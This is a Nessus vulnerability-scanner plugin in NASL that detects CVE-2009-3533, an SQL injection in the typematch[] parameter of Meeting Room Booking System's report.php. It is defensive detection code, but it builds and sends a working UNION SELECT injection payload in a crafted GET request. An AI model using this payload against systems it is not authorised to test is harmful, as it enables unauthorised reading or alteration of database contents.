#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(50002);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2014/08/09 00:11:23 $");

  script_cve_id("CVE-2009-3533");
  script_bugtraq_id(43550);
  script_osvdb_id(55872);
  script_xref(name:"Secunia", value:"35469");

  script_name(english:"Meeting Room Booking System typematch Parameter SQL Injection");
  script_summary(english:"Checks for Meeting Room Booking System SQL Injection");

  script_set_attribute(
    attribute:"synopsis",
    value:

"A PHP script hosted on the remote web server is affected by a SQL
Injection Vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote Meeting Room Booking System install is affected by a SQL
injection vulnerability because its 'report.php' script does not
properly sanitize input to the 'typematch[]' parameter before using it
in a database query.

An attacker is able to obtain or modify data in the Meeting Room
Booking System database.

Note that PHP's 'magic_quotes_gpc' setting may need to be disabled to
successfully exploit this vulnerability."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e55db0e6");
  script_set_attribute(attribute:"solution", value:"Update to version 1.4.2 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(89);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/07/15");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/07/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/10/18");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2014 Tenable Network Security, Inc.");

  script_dependencies("mrbs_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP", "www/mrbs");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(
  appname      : 'mrbs',
  port         : port,
  exit_on_fail : TRUE
);
dir = install['dir'];

magic1    = 'NESSUS';
magic2    = unixtime();
magic3    = rand();
exploit   = '\'+UNION+SELECT+1,2,3,"'+magic1+'",5,6,7,8,"'+magic2+'","'+magic3+'"+--+';

url = install['dir'] + '/report.php?' +
  'From_day=7&' +
  'From_month=10&' +
  'From_year=2010&' +
  'To_day=6&' +
  'To_month=12&' +
  'To_year=2010&' +
  'areamatch=&' +
  'roommatch=&' +
  'typematch[]=' + exploit + '&' +
  'namematch=&' +
  'descrmatch=&' +
  'creatormatch=&' +
  'summarize=1&' +
  'sortby=r&' +
  'display=d&' +
  'sumby=d';

r = http_send_recv3(
  port         : port,
  method       : 'GET',
  item         : url,
  exit_on_fail : TRUE
);

if (
  r[2] &&
  magic1 + '</a>' >< r[2] &&
  '<h2>Room: '+magic2+' - '+magic3+'</h2>' >< r[2]
)
{
  set_kb_item(name:"www/"+port+"/SQLInjection", value:TRUE);

  if (report_verbosity > 0)
  {
    report = get_vuln_report(
      items     : url,
      port      : port
    );
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else exit(0, "The Meeting Room Booking System install at "+build_url(port:port, qs:dir+'/')+" is not affected.");
